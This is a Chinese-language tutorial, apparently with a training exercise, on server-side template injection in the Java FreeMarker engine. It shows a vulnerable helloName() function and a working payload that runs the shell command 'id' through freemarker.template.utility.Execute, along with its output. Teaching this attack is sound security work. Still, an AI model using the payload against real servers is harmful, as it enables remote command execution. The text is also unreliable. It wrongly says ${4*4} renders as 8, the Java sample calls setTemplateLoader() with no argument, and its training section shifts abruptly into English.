# 服务端模板注入（SSTI）——FreeMarker

`FreeMarker` 是一种用于 Java 的模板引擎，通常用于渲染 HTML 网页。模板使用 FreeMarker 模板语言（`FTL`）编写，这是一种简单而专用的语言。它通过提供转义机制来帮助构建安全的应用程序，从而防范 [XSS] 之类的攻击。但如果使用不当，也可能引发严重的安全问题。如果恶意用户能够控制模板本身，就可以执行任意 `FTL` 代码。这种攻击被称为服务端模板注入（`SSTI`），PortSwigger Research 对此已有充分研究：[PortSwigger Research](https://portswigger.net/research/server-side-template-injection)。

## 示例

假设以下 Java 代码实现了一个简单的 `helloName()` 函数。

### `helloName()`

```java
public static String helloName(String name) {
    StringTemplateLoader stringTemplate = new StringTemplateLoader();
    Configuration configuration = new Configuration(Configuration.VERSION_2_3_28);
    configuration.setTemplateLoader();

    stringTemplate.putTemplate("template", "Hello " + name + "!");

    Template template = configuration.getTemplate("template");
    Writer writer = new StringWriter();
    template.process(null, writer);

    return writer.toString();
}
```

这里，`name` 变量由用户提供，并被直接用于模板代码中。这是一种基本的模板注入。变量替换后的模板如下：

`hunter2`
```text
Hello hunter2!
```

接下来看看当我们尝试注入一些 `FTL` 代码时会发生什么。

- 注入 `FTL`
    `${4*4}`
    ```java
    Hello ${4*4}!
    ```

当 `$name` 是有效的 `FTL` 代码时，服务器会对其进行解释并渲染结果。用户得到的结果不会是 `Hello ${4*4}!`，而是会渲染出 `Hello 8!`。但在这种情况下，攻击者能做的并不止于此。通过使用 `FreeMarker` 的内部函数，还可以执行更多操作，例如：

- 运行 shell 命令
    `Hello ${"freemarker.template.utility.Execute"?new()("id")}!`
    ```java
    ${"freemarker.template.utility.Execute"?new()("id")}
    ```

## 训练

### Command execution 

Thanks to some features of Freemarker, it is possible to execute shell command.

Goal: Execute the `id` shell command

code

```
Hello §输入§!

```

输入

```java
${"freemarker.template.utility.Execute"?new()("id")}
```

输出

```log
Hello uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
!

```
